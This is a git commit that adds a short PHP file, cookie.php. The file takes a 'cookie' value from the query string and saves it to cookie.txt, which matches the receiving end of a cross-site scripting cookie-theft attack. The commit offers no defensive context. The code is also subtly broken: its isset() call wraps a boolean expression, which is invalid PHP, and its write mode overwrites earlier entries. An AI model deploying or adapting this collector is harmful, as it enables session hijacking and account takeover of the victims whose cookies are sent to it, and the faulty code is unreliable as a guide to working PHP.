0dcfc44ed1f97eb8abd3cf2eb67d051292104a83
NeilSauv2003 <45914671+NeilSauv2003@users.noreply.github.com>
2020-05-22 14:17:57 +0200

    Add files via upload

---
+++ cookie.php
@@ -0,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Cookie</title>
+</head>
+
+<body>
+</body>
+</html> 
+<?php
+if(isset($_GET["cookie"] AND !empty($_GET["cookie"]))
+{
+	$cookie = $_GET["cookie"];
+	$file = fopen("cookie.txt", "w");
+	fwrite($file, $cookie."\n");
+	fclose($file);
+}
